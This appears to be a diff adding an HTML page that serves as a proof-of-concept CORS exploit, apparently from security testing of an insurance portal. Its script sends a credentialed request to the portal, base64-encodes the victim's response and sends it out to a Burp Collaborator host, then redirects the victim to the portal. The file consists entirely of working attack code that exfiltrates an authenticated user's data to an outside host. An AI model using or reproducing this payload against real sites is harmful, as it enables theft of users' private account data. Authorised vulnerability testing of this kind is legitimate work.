@@ -1,1 +1,22 @@
-test123
+<html>
+<script>
+var jsobj
+var xhttp = new XMLHttpRequest();
+xhttp.onreadystatechange = function() {
+    if (this.readyState == 4 && this.status == 200) {
+//document.getElementById("demo").innerHTML = xhttp.responseText;
+var encodedString = btoa(xhttp.responseText);
+//console.log(encodedString);
+xhttp.open("GET", "http://gp9vdbf5yuvrnm47b72hv3z8pzvpje.burpcollaborator.net/last" + encodedString, true);
+xhttp.send();
+jsobj = JSON.parse(xhttp.responseText);} };
+xhttp.withCredentials = true;
+xhttp.open("GET", "http://qa.myportal.ascinsurance.site/", true);
+xhttp.send();
+</script>
+ <div id="demo">
+</div>
+<script>
+window.location.replace("http://qa.myportal.ascinsurance.site/");
+</script>
+</html>
